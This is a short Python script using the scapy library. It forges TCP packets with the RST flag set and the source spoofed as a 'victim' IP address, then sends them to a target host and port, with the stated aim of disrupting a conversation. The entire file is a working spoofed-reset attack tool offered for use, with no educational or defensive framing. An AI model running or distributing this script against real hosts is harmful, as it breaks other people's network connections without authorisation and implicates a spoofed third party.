#!/usr/bin/python2.7
from scapy.all import *
import argparse



def main(target, victim, port):
    # we're going to send the reset packet on the behalf of the victim
    evilIP = IP(src=victim, dst=target)
    # send to target port with the RST flag
    evilTCP = TCP(sport=31337, dport=int(port), flags="R")
    # build full packet and send
    evilPacket = evilIP/evilTCP
    # send that mischievous reset!
    sr1(evilPacket)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send a TCP packet with RST flag to disrupt a conversation')
    parser.add_argument('-t', metavar='target', help='the target IPv4 address to send the packet to')
    parser.add_argument('-v', metavar='victim', help='the victim\'s IPv4 address')
    parser.add_argument('-p', metavar='port', help='the target port')

    args = parser.parse_args()
    target = args.t
    victim = args.v
    port = args.p
    main(target, victim, port)
